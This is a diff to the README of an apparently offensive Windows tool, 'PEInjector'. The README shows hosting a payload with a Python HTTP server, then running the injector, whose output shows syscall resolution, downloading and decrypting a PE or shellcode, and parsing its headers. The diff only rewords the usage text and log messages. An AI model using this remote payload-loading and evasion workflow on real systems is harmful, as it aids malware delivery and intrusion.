@@ -54,7 +54,7 @@ PS C:\Users\nullb1t3\Desktop> python -m http.server 80
 Serving HTTP on :: port 80 (http://[::]:80/) ...
  ```
  
- - Run it by downloading from a webserver or read it from a file locally (debug output can be turned off)
+ - Run it, by downloading the PE from a webserver or read it from a file locally (debug output can be turned off)
  ```powershell
  PS C:\Users\nullb1t3\Desktop> .\PEInjector.exe
 [*] Initializing syscalls structure.
@@ -89,9 +89,9 @@ Serving HTTP on :: port 80 (http://[::]:80/) ...
 [*] NtClose SSN: 15.
 [*] Init done!
 
-[*] Downloaded the shellcode with size: 1355264
-[*] Decrypting shellcode with size: 1355264.
-[*] Decrypted shellcode!
+[*] Downloaded the PE with size: 1355264
+[*] Decrypting the PE with size: 1355264.
+[*] Decrypted!
 [*] Parsing loaded PE file's headers
 [*] Populating Data Directories
 [*] Parsing finished
